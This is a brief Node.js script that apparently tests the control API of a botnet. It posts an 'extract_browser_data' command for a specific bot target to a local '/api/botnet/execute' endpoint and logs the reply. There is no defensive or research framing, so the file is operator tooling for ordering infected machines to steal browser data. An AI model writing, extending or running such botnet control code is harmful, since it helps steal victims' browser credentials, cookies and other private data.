const http = require('http');

function testAPI() {
    const postData = JSON.stringify({
        action: 'extract_browser_data',
        target: 'e20be584b8edbb6a'
    });

    const options = {
        hostname: 'localhost',
        port: 3000,
        path: '/api/botnet/execute',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(postData)
        }
    };

    const req = http.request(options, (res) => {
        console.log(`Status: ${res.statusCode}`);
        console.log(`Headers: ${JSON.stringify(res.headers)}`);
        
        let data = '';
        res.on('data', (chunk) => {
            data += chunk;
        });
        
        res.on('end', () => {
            console.log('Response:', JSON.parse(data));
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.write(postData);
    req.end();
}

// Test the API
testAPI();
